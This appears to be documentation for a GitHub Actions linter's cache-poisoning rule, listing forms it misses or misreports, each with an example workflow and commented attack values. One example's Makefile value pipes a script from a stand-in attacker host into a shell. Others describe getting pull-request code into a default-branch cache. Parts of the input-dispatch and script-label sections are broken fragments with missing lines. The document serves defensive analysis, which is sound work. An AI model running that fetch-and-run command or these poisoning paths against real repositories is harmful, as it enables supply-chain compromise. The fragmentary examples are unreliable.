  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: limitation (decided by: run-time)
  - example: npm-abbreviation.yml (workflow, undetected)
    ```yaml
    # situation: on workflow_dispatch, a job with no cache-mode checks out the
    #   ref that ${{ inputs.ref }} names and runs npm tes.
    # reason: a limitation (run time): npm reads tes as the npm command test,
    #   because tes is the beginning of no other command name or alias name of
    #   the npm release that the job uses, and npm test runs the script test of
    #   the package.json of the ref; which names the npm release has is known when
    #   the job runs.
    # cause: the rule reads npm tes as a step that runs no code of the tree,
    #   so the job neither saves the tree to the cache nor runs it, and the rule
    #   reports nothing, not the inconclusive kind input-dispatch.
    # attack-value: the file package.json in the ref that inputs.ref names = "{\"scripts\":{\"test\":\"echo PWNED\"}}"
    # attack-run-behavior: when the one who dispatches the workflow gives the
    #   ref of an attacker, npm tes runs the script test of the attacker, which
    #   prints PWNED and can save an entry to the cache of the branch of the run.
    on:
      workflow_dispatch:
        inputs:
          ref:
            type: string
    jobs:
      build:
        runs-on: ubuntu-latest
        permissions: {}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ inputs.ref }}
          - run: npm tes
    ```
- npm-option-value-command: a command that runs npm with an option placed before the npm command, when the value of the option is the name of an npm command and the npm command runs code of the checked out tree (for example, npm --cache view ci, in which view is the name of a directory), in a run step or in a permission of an agent. The rule reads the first word after npm, other than the value of the option --prefix or -C, that is the name or the alias name of an npm command as the npm command, and so reads the value view as the npm command.
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: limitation (decided by: run-time)
  - example: npm-option-value-command.yml (workflow, undetected)
    ```yaml
    # situation: on workflow_dispatch, a job with no cache-mode checks out the
    #   ref that ${{ inputs.ref }} names and runs npm --cache view ci.
    # reason: a limitation (run time): npm reads view as the value of the
    #   option --cache, which takes a value, and runs npm ci, which runs the
    #   script preinstall of the package.json of the ref; which options take
    #   a value is in the definitions of the npm release that the job uses,
    #   which is known when the job runs.
    # cause: the rule reads the first word after npm that is the name of an
    #   npm command as the npm command, so the rule reads npm --cache view ci as
    #   npm view, a step that runs no code of the tree, and reports nothing, not the inconclusive kind
    #   input-dispatch.
    # attack-value: the file package.json in the ref = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: npm --cache view ci runs the script preinstall,
    #   which prints PWNED, and can save an entry to the cache of the branch of the run.
    on:
      workflow_dispatch:
        inputs:
          ref:
            type: string
    jobs:
      build:
        runs-on: ubuntu-latest
        permissions: {}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ inputs.ref }}
          - run: npm --cache view ci
    ```
- dispatch-job: a job on workflow_dispatch that saves to the cache, or runs, the code of a ref of the repository, with no input of workflow_dispatch in the ref and the repository of its checkout: the one who dispatches the workflow chooses as the ref of the run only a branch or a tag of the repository, so the job saves what those who can write to the repository pushed
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: no-added-gain
  - example: dispatch-job.yml (workflow, undetected)
    ```yaml
    # situation: on workflow_dispatch, a job with no cache-mode checks out the
    #   ref of the run, runs npm ci, and actions/cache saves node_modules.
    # reason: the form adds nothing to what the attacker gets (the disposition
    #   no-added-gain): the one who dispatches the workflow chooses as the ref
    #   only a branch or a tag of the repository, so the job builds and saves what
    #   those who can write to the repository pushed.
    # cause: the rule reads the jobs that an attacker's event runs, and of a job
    #   on workflow_dispatch only the values that an input of workflow_dispatch
    #   decides.
    # attack: the one who dispatches the workflow chooses a branch of the
    #   repository as the ref of the run.
    # attack-run-behavior: the REST API of GitHub refuses a dispatch with a
    #   commit SHA or refs/pull/1/head as the ref, with the status 422; with a
    #   branch of the repository, the checkout fetches that branch, npm ci runs
    #   its package.json, and actions/cache saves node_modules to the scope of
    #   that branch.
    on: workflow_dispatch
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/cache@v4
            with:
              path: node_modules
              key: npm-${{ hashFiles('package-lock.json') }}
          - run: npm ci
    ```
- script-label: a label that a workflow of the same repository adds from what an attacker wrote, with a token other than the GITHUB_TOKEN, by a script (gh pr edit --add-label, the labels endpoint of the REST API through gh api, addLabels of actions/github-script) or by an action other than actions/labeler: the label is on the pull request or the issue of the attacker, and the rule does not read the scripts and the actions that add labels
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: repo-file)
  - added attackers: triage-account, writer-pull-requests-token, app-installation-token
  - example: .github/workflows/labeled.yml (workflow, undetected)
    ```yaml
    # situation: labeler.yml runs on pull_request_target and adds the label
    #   safe-to-test with gh and a personal access token to a pull request whose
    #   title has [site]; labeled.yml runs on pull_request_target on labeled when
    #   the label is safe-to-test, and the job has cache-mode write, checks out
    #   the head of the pull request and runs npm ci.

    #   labeled.yml, and npm ci runs the preinstall script of the pull request in
    #   a job that may save to the cache of the scope of the default branch, so
    #   the code of the attacker can save an entry there.
    on:
      pull_request_target:
        types: [labeled]
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```

- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/cache-poisoning-unanswered, whose content is
    #   the workflow of the true positive writable-job
    #   (writable-job.tanstack.yml) of the rule, with on: workflow_call in place
    #   of the on of writable-job.tanstack.yml. The linter has no answer of the
    #   fact workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    # attack-value: the file packages/history/vite_setup.mjs in the pull request = "console.log('PWNED')"
    # attack-run-behavior: the checkout fetches refs/pull/<n>/merge, the build
    #   runs the pull request's code, which writes into the pnpm store; at the
    #   end of the job actions/cache saves the store to the default branch's
    #   scope, and the release workflow restores it and runs it.
    on:
      pull_request_target:
        paths: ['packages/**']
    permissions: {}
    jobs:
      c:
        uses: example-org/cache-poisoning-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```
- combined-credentials: a job that runs only when a label is added to a pull request (pull_request_target with the activity type labeled), whose if needs both a label and the author_association MEMBER or COLLABORATOR of the author of the pull request, in a run of the linter that adds read-member and writer-pull-requests-token or app-installation-token, and does not add triage-account: one attacker who holds both credentials opens the pull request from the account with the read role and adds the label with the token, and the job runs for the pull request of the attacker in the same way that the job runs for a pull request after a person who can add labels adds the label to approve the pull request. The linter runs the rules once for each added attacker alone and reads each added attacker as a separate attacker, so no run lets one attacker past both the if of author_association and the approval by the label. A run that adds triage-account reports the job, as an account with the triage role both has the author_association MEMBER or COLLABORATOR and adds a label
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: same-file)
  - added attackers: triage-account
  - example: combined-credentials.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_target with the activity type labeled, a job
    #   whose if needs the label safe-to-test and the author_association MEMBER
    #   of the author of the pull request writes cache-mode write, checks out
    #   the head of the pull request with allow-unsafe-pr-checkout, and runs
    #   make test.
    # reason: a todo (more analysis by the linter): one attacker who holds
    #   both an account with the read role and a token of a writer with the
    #   Pull requests permission (the added attackers read-member and
    #   writer-pull-requests-token) opens the pull request from the account,
    #   whose author_association is MEMBER, and adds the label with the token,
    #   and the job, which may save to the cache of the default branch, runs on
    #   the pull request of the attacker.
    # cause: the linter runs the rules once for each added attacker alone, and
    #   reads each added attacker as a separate attacker: the run that adds
    #   read-member does not let the attacker add a label, and the run that
    #   adds writer-pull-requests-token reads the author of the pull request
    #   as an outsider. A run that adds triage-account reports the job, as an
    #   account with the triage role both has the author_association MEMBER
    #   and adds a label.
    # attack-value: the file Makefile in the head of the pull request = "test:\n\tcurl -fsS https://attacker.example/poison.sh | sh\n"
    # attack-run-behavior: the member account opens a pull request from a fork,
    #   the token adds the label safe-to-test, the if is true, the checkout
    #   fetches head.sha, and make runs the target test of the pull request,
    #   which saves an entry of the attacker to the cache of the default
    #   branch.
    on:
      pull_request_target:
        types: [labeled]
    jobs:
      test:
        if: contains(github.event.pull_request.labels.*.name, 'safe-to-test') && github.event.pull_request.author_association == 'MEMBER'
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
              allow-unsafe-pr-checkout: true
          - run: make test
    ```

- step-output-run: the output of a step that runs a script (steps.&lt;id>.outputs), which the script writes to \$GITHUB_OUTPUT
  - disposition: todo (needs: same-file)
  - example: step-output-run.yml (workflow, inconclusive)
    ```yaml
    # situation: on issues, a job with cache-mode: write saves build with
    #   actions/cache/save under a key that has ${{ steps.s.outputs.o }}.
    # reason: the output is what the script writes at run time, so whether an
    #   attacker controls it is not known.
    # attack-value: steps.s.outputs.o = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
    # attack-run-behavior: when ${{ steps.s.outputs.o }} holds the value, the job
    #   saves build to the cache of the default branch's scope under build-<value>,
    #   a key the attacker chose.
    on: issues
    cache-mode: write
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - id: s
            run: echo "o=x" >> "$GITHUB_OUTPUT"
          - uses: actions/cache/save@v4
            with:
              path: build
              key: build-${{ steps.s.outputs.o }}
    ```

- input-dispatch: an input of workflow_dispatch (inputs, github.event.inputs): whoever dispatches the workflow chooses the value of the input. A credential whose only write access is to the permission Actions can dispatch the workflow, and the credential premise keeps the holder of such a credential as a possible attacker; the linter does not know whether such a credential exists or who holds it. The rule reports the value in a job with an environment that has required reviewers too, where a required reviewer of the environment can stop the run

    ```yaml
    # situation: on workflow_dispatch, a job with no cache-mode saves build with
    #   actions/cache/save under a key that has ${{ inputs.x }} and ${{
    #   github.event.inputs.x }}.
    # reason: whoever dispatches the workflow chooses the value, and the workflow
    #   does not tell who that is, so whether an attacker controls it is not known;
    #   nothing the rule could read is expected to tell it.
    # attack-value: inputs.x = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
    # attack-run-behavior: a run of workflow_dispatch saves to the cache with no
    #   cache-mode; when the one who dispatches the workflow chooses the default
    #   branch as the ref and gives the value as x, which ${{ inputs.x }} and
    #   ${{ github.event.inputs.x }} both hold, the job saves build to the cache
    #   of the default branch's scope under build-<value> <value>, a key the one
    #   who dispatches the workflow chose.
    on:
      workflow_dispatch:
        inputs:
          x: {}
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/cache/save@v4
            with:
              path: build
              key: build-${{ inputs.x }} ${{ github.event.inputs.x }}
    ```

    ```yaml
    #   ref that ${{ inputs.ref }} names, then runs pnpm build, which runs the

    # attack-run-behavior: a run of workflow_dispatch has write access to the

    #   chooses the default branch as the ref of the run and a ref of an attacker
    #   as ref, pnpm build runs the script build of the attacker, which can save
    #   an entry to the cache of the default branch's scope.

      workflow_dispatch:
        inputs:
          ref:
            type: string

        runs-on: ubuntu-latest
    ```

    ```yaml
        cache-mode: write
        steps:
          - uses: actions/checkout@v4
            with:
              ref: refs/pull/${{ github.event.issue.number }}/head
          - uses: example-org/unreachable-composite@v1
    ```
- archive-substituted: a step of a composite action of another repository that saves to the cache what a checkout of a pull request's code brings, whose action.yml (or action.yaml) in the archive the runner downloads is unlike its blob (export-subst): placeholders such as %d and %(describe) take the names of refs created after the commit, so the step the runner runs may differ from the step the linter read
  - disposition: limitation (decided by: run-time)
  - example: archive-substituted.yml (workflow, inconclusive)
    ```yaml
    # situation: after a checkout of the pull request's head, a job with
    #   cache-mode: write runs a composite action of another repository whose
    #   step saves dist to the cache, and the archive the runner downloads has
    #   the file of the action unlike its blob (export-subst).
    # reason: placeholders such as %d and %(describe) take the names of refs
    #   made after the run (seen on 2026-10-31), so the step the runner runs
    #   may differ from the step read.
    # attack-value: the file dist/index.js in the pull request's head = "console.log('PWNED')"
    # attack-run-behavior: when the step the runner runs saves dist, the
    #   attacker's index.js is saved to the default branch's scope.
    on: issue_comment
    jobs:
      a:
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/checkout@v4
            with:
              ref: refs/pull/${{ github.event.issue.number }}/head
          - uses: example-org/substituted-composite@v1
    ```
- remote-callee-unknown: a job that calls a reusable workflow of another repository, when the linter asked the fact workflow.definition for the reusable workflow and got no answer (the token that the linter uses cannot read the file, the file is larger than the limit, or the linter has used up the requests it may send to the GitHub API), or when the call is deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact: the rule does not read the jobs and the steps of the reusable workflow
  - disposition: todo (needs: fact)
  - example: remote-callee-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/cache-poisoning-unknown, whose content is the
    #   workflow of the true positive writable-job (writable-job.tanstack.yml)
    #   of the rule, with on: workflow_call in place of the on of
    #   writable-job.tanstack.yml. The linter asked the fact workflow.definition
    #   for the reusable workflow and got no answer.
    # reason: what the jobs of the reusable workflow do is in the file that the
    #   linter could not read; whoever changes the uses, such as the author of a
    #   pull request, can name a reusable workflow that the token that the
    #   linter uses cannot read.
    # attack-value: the file packages/history/vite_setup.mjs in the pull request = "console.log('PWNED')"
    # attack-run-behavior: the checkout fetches refs/pull/<n>/merge, the build
    #   runs the pull request's code, which writes into the pnpm store; at the
    #   end of the job actions/cache saves the store to the default branch's
    #   scope, and the release workflow restores it and runs it.
    on:
      pull_request_target:
        paths: ['packages/**']
    permissions: {}
    jobs:
      c:
        uses: example-org/cache-poisoning-unknown/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- cache-mode-over-request: a job that calls a reusable workflow with cache-mode write-only, where the job of the reusable workflow writes cache-mode write: cache-mode write-only of the calling job does not grant the restore that cache-mode write asks for, so GitHub does not start the run, but the rule reads cache-mode write-only of the calling job as a mode that lets the reusable workflow save to the cache
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout
  - disposition: todo (needs: same-file)
  - example: .github/workflows/called.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request_target, a job calls a reusable workflow with
    #   cache-mode: write-only; the job of the reusable workflow writes
    #   cache-mode: write, checks out the head of the pull request and saves
    #   dist to the cache.
    # reason: cache-mode: write-only of the calling job limits the reusable
    #   workflow, and write asks for more than the limit (write-only grants no
    #   restore, and write grants restore and save): GitHub does not start a run
    #   whose called workflow asks for more than the limit, so nothing of the
    #   pull request's is saved.
    # cause: the rule reads cache-mode: write-only of the calling job as a mode
    #   that lets the job save to the cache, and does not compare it with the
    #   cache-mode of the reusable workflow.
    # attack-value: the file dist/index.js in the pull request's head = "console.log('PWNED')"
    # attack-run-behavior: the pull request starts ci.yml; the reusable workflow
    #   asks for write past the limit write-only, and the run does not start.
    on: workflow_call
    jobs:
      j:
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
              allow-unsafe-pr-checkout: true
          - uses: actions/cache@v4
            with:
              path: dist
              key: dist-${{ hashFiles('package-lock.json') }}
    ```
    - finding on: .github/workflows/called.yml, .github/workflows/ci.yml
    - .github/workflows/ci.yml (workflow)
      ```yaml
      on: pull_request_target
      jobs:
        c:
          cache-mode: write-only
          uses: ./.github/workflows/called.yml
      ```
- nested-caller-limit: a reusable workflow called through another one, whose first caller writes cache-mode read or none: that limit holds for every workflow it calls, and GitHub does not start a run that asks for more; the rule reads the limit of the caller next to the workflow only
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: repo-file)
  - example: .github/workflows/called.yml (workflow, false-positive)
    ```yaml
    # situation: a reusable workflow whose job writes cache-mode: write checks
    #   out the head of the pull request and saves dist to the cache. mid.yml
    #   calls it with no cache-mode, and ci.yml calls mid.yml on
    #   pull_request_target with cache-mode: read.
    # reason: the read of ci.yml limits every workflow it calls, mid.yml's and
    #   through it this one's: GitHub does not start a run whose called
    #   workflow asks for more than the limit, so nothing of the pull request's
    #   is saved.
    # cause: the rule reads the cache-mode of the caller that calls this
    #   workflow, mid.yml, which writes none, and not of the caller of that
    #   caller.
    # attack-value: the file dist/index.js in the pull request's head = "console.log('PWNED')"
    # attack-run-behavior: the pull request starts ci.yml; the called workflow
    #   asks for write past the limit read, and the run does not start.
    on: workflow_call
    jobs:
      j:
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
              allow-unsafe-pr-checkout: true
          - uses: actions/cache@v4
            with:
              path: dist
              key: dist-${{ hashFiles('package-lock.json') }}
    ```
    - finding on: .github/workflows/called.yml
    - .github/workflows/ci.yml (workflow)
      ```yaml
      on: pull_request_target
      jobs:
        c:
          cache-mode: read
          uses: ./.github/workflows/mid.yml
      ```
    - .github/workflows/mid.yml (workflow)
      ```yaml
      on: workflow_call
      jobs:
        m:
          uses: ./.github/workflows/called.yml
      ```
- writer-string: a string only those who can write to the repository, or moderate or administer its organization, set, which the webhook schema leaves free and the table reads as arbitrary, such as the name of a label (https://docs.github.com/en/issues/using-labels-and-milestones-to-track-work/managing-labels), the reason a comment is hidden (https://docs.github.com/en/communities/moderating-comments-and-conversations/managing-disruptive-comments), the name of an issue field or of its option (https://docs.github.com/en/issues/tracking-your-work-with-issues/using-issues/managing-issue-fields-in-your-organization)
  - finding kinds: cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: same-file)
  - example: writer-string.yml (workflow, false-positive)
    ```yaml
    # situation: on issues labeled, a job that writes the cache saves it under
    #   the label's name.
    # reason: only those who can write to the repository create a label, so the
    #   key is no attacker's.
    # cause: the webhook schema gives the name no enum, and the table reads a
    #   free string as arbitrary.
    # attack: no attacker can name a label; were the name theirs, they would
    #   choose the key of the entry the job saves.
    # attack-run-behavior: the job saves build under the label's name, which
    #   only those who can write chose.
    on: {issues: {types: [labeled]}}
    jobs:
      a:
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - run: make
          - uses: actions/cache/save@v4
            with:
              path: build
              key: ${{ github.event.label.name }}
    ```
- if-unnarrowed: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('&#91;...]'), value)), where each string has only ASCII letters, digits, spaces, -, \_, . and /, does not start with -, and has no - right after a space, where the rule reports the value although the if limits the value to those strings, because the rule does not read the if in one of three forms. (1) A reusable workflow or a composite action gets the value through an input, and the if of the calling job or the calling step compares the value. The rule reports the value in the file of the reusable workflow or the composite action. The value is harmless when the if of every caller of that file, inside and outside the repository, compares the value. (2) The if compares the value under one name, and the script writes the value under another name: for example, the if compares env.BODY, which the env of the step sets to \${{ github.event.comment.body }}, and the script writes \${{ github.event.comment.body }}; or the if compares \${{ github.head_ref }}, and the script writes \${{ github.event.pull_request.head.ref }}. The value is harmless when the two names hold the same value in the step; the rule does not check that the two names hold the same value. (3) The if of a step that uses an action compares a value that the with or the env of the same step holds. At the start of the job, the runner runs the pre step of each action from another repository whose action.yml has runs.pre, under the condition runs.pre-if of that action.yml and not under the if of the step. For the pre step, the runner evaluates the with and the env of the step, and the code of the pre step may read the inputs. The runner runs no pre step of a local action (./). The value is harmless when the action has no pre step, or when the code of the pre step does not read the value. In each form, the value is harmless only where the case of the letters does not change what the value names (the undetected form if-compared)
  - finding kinds: cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: same-file)
  - example: if-unnarrowed.yml (workflow, false-positive)
    ```yaml
    # situation: on issue_comment, in a job with cache-mode: write, a step of
    #   actions/cache/save runs only when the comment's body is deps-linux, and
    #   saves the directory build under the key
    #   ${{ github.event.comment.body }}.
    # reason: the step's if lets the key be only deps-linux, ignoring the case
    #   of its letters, so the commenter does not choose a key that a later run
    #   computes; actions/cache/save has no pre step.
    # cause: the rule does not limit the with of a step that uses an action by
    #   the if of the step. At the start of the job, the runner runs the pre
    #   step of an action from another repository whose action.yml has
    #   runs.pre, under the condition runs.pre-if of that action.yml and not
    #   under the if of the step, and the runner evaluates the with for the pre
    #   step.
    # attack-value: github.event.comment.body = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
    # attack-run-behavior: the step's if is false for such a body, and the
    #   runner skips the step.
    on: issue_comment
    jobs:
      a:
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - run: make
          - if: github.event.comment.body == 'deps-linux'
            uses: actions/cache/save@v4
            with:
              path: build
              key: ${{ github.event.comment.body }}
    ```
- unmatchable-pattern: a label of the configuration of actions/labeler whose globs or regular expressions match no path or no branch name, such as the glob pages/\*\* together with the negated glob !pages/\*\*: the rule reads each glob and each regular expression as one that a pull request can match
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: same-file)
  - example: .github/workflows/labeled.yml (workflow, false-positive)
    ```yaml
    # situation: labeler.yml runs actions/labeler on pull_request_target with a
    #   personal access token; the configuration .github/labeler.yml adds the
    #   label safe-to-test to a pull request that changes a file that is under
    #   site/ and not under site/, which no file is; labeled.yml runs on
    #   pull_request_target on labeled when the label is safe-to-test, and the job
    #   has cache-mode write, checks out the head of the pull request and runs npm
    #   ci.
    # reason: no file matches both globs, so actions/labeler never adds the label,
    #   and only a person adds it.
    # cause: the rule reads each glob as one that a pull request can match.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"mkdir -p ~/.npm && echo PWNED > ~/.npm/PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/; actions/labeler adds no label, and labeled.yml
    #   does not run until a person adds the label safe-to-test.
    on:
      pull_request_target:
        types: [labeled]
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
    - finding on: .github/workflows/labeled.yml
    - .github/labeler.yml (repo-file)
      ```yaml
      safe-to-test:
        - changed-files:
            - all-globs-to-any-file: ['site/**', '!site/**']
      ```
    - .github/workflows/labeler.yml (workflow)
      ```yaml
      on: pull_request_target
      permissions: {}
      jobs:
        label:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/labeler@v5
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
      ```
- labeled-actor-if: an if that compares the actor or the sender of the labeled run with a name or a type, such as github.event.sender.login == 'release-bot' or github.event.sender.type != 'Bot': the actor of a labeled run whose label actions/labeler adds is the account or the app of the token of actions/labeler, the linter does not know the name or the type of the actor, and the rule reads the if as one that the labeled run passes
  - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
  - disposition: todo (needs: fact)
  - example: .github/workflows/labeled.yml (workflow, false-positive)
    ```yaml
    # situation: labeler.yml runs actions/labeler on pull_request_target with a
    #   personal access token; the configuration .github/labeler.yml adds the
    #   label safe-to-test to a pull request that changes a file under site/;
    #   labeled.yml runs on pull_request_target on labeled when the label is
    #   safe-to-test and the sender of the run is the account release-bot, and the
    #   job has cache-mode write, checks out the head of the pull request and runs
    #   npm ci.
    # reason: the personal access token of actions/labeler belongs to an account
    #   other than release-bot, so the sender of the labeled run is not
    #   release-bot, and the job does not run for the label of actions/labeler.
    # cause: the rule does not know the name of the account of the token, and
    #   reads the if as one that the labeled run passes.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"mkdir -p ~/.npm && echo PWNED > ~/.npm/PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/; actions/labeler adds the label safe-to-test,
    #   which starts labeled.yml, and the if is false, as the sender of the run is
    #   the account of the token and not release-bot.
    on:
      pull_request_target:
        types: [labeled]
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test' && github.event.sender.login == 'release-bot'
        runs-on: ubuntu-latest
        cache-mode: write
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
    - finding on: .github/workflows/labeled.yml
    - .github/labeler.yml (repo-file)
      ```yaml
      safe-to-test:
        - changed-files:
            - any-glob-to-any-file: 'site/**'
      ```
    - .github/workflows/labeler.yml (workflow)
      ```yaml
      on: pull_request_target
      permissions: {}
      jobs:
        label:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/labeler@v5
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
      ```
